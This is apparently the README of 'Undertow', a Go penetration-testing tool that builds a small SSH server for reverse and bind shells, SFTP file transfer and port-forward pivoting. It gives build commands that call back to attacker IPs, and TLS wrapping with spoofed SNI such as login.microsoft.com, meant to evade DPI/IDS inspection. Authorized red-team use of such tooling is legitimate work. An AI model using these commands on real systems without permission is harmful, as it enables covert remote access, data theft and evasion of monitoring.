<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Undertow/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Undertow/main/docs/assets/logo-light.svg">
  <img alt="Undertow" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Undertow/main/docs/assets/logo-dark.svg" width="520">
</picture>

![Go](https://img.shields.io/badge/language-Go-00ADD8.svg)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey)
![License](https://img.shields.io/badge/license-GPLv3-blue.svg)

**Statically-linked SSH server for penetration testing — under 1.5MB.**

Reverse shells, bind shells, SFTP file transfer, and full SSH port forwarding in a single static binary. Optional TLS wrapping hides SSH inside HTTPS to evade DPI/IDS on the wire.

> **Authorization Required**: Designed exclusively for authorized security testing with explicit written permission.

</div>

---

## Quick Start

**Prerequisites:** Go 1.15+, Make

```bash
git clone https://github.com/Real-Fruit-Snacks/Undertow.git
cd Undertow
```

**Reverse shell:**

```bash
./build.sh reverse 192.168.1.10:4444
./bin/handler-192-168-1-10-4444    # start handler, shows SSH command on callback
```

**Bind shell:**

```bash
./build.sh listen 8888
ssh -p 8888 svc@TARGET_IP          # connect from attacker
```

---

## Features

### Reverse & Bind Modes

Reverse mode dials home through firewalls. Bind mode listens on target. Both support PTY, SFTP, and port forwarding identically.

```bash
./build.sh reverse 10.10.14.5:4444           # reverse shell
./build.sh listen 8888                        # bind shell
./build.sh reverse 10.10.14.5:443 --tls      # TLS-wrapped reverse
./build.sh listen 8888 --tls --sni google.com # TLS with SNI spoofing
```

### TLS Wrapping

Wraps SSH inside TLS with ALPN negotiation and SNI spoofing. On the wire it looks like HTTPS — the SSH banner never appears in plaintext.

```bash
./build.sh reverse 10.10.14.5:443 --tls --sni login.microsoft.com
```

### SFTP File Transfer

Built-in SFTP subsystem. Upload tools, download loot — all through the same SSH connection.

### Port Forwarding

Local, remote, and dynamic (SOCKS) forwarding. Pivot through the target to reach internal networks.

```bash
ssh -D 1080 svc@TARGET      # SOCKS proxy
ssh -L 8080:internal:80 svc@TARGET  # local forward
```

### Handler Scripts

Build script auto-generates a handler that starts the listener, displays credentials, and shows the SSH command when a callback arrives.

---

## Architecture

```
Undertow/
├── main.go              # Entry point, mode selection
├── core.go              # SSH server configuration, key generation
├── ssh_session.go       # Session handling, PTY, SFTP
├── ssh_session_unix.go  # Linux PTY via creack/pty
├── ssh_session_windows.go  # Windows ConPTY
├── build.sh             # Build script with handler generation
└── Makefile
```

Single static binary. `CGO_ENABLED=0` cross-compilation. Under 1.5MB for Linux. Optional UPX compression via `--compress`.

---

## Platform Support

| | Linux | Windows |
|---|---|---|
| Reverse shell | Full (PTY) | Full (ConPTY) |
| Bind shell | Full | Full |
| SFTP | Full | Full |
| Port forwarding | Full | Full |
| TLS wrapping | Full | Full |

---

## Security

Report vulnerabilities via [GitHub Security Advisories](https://github.com/Real-Fruit-Snacks/Undertow/security/advisories). 90-day responsible disclosure.

**Undertow does not:**
- Persist or install itself (single execution, no persistence)
- Evade EDR/XDR behavioral analysis
- Hide network connections from netstat or ss
- Operate without valid SSH credentials

---

## License

[GPLv3](LICENSE) — Copyright 2026 Real-Fruit-Snacks
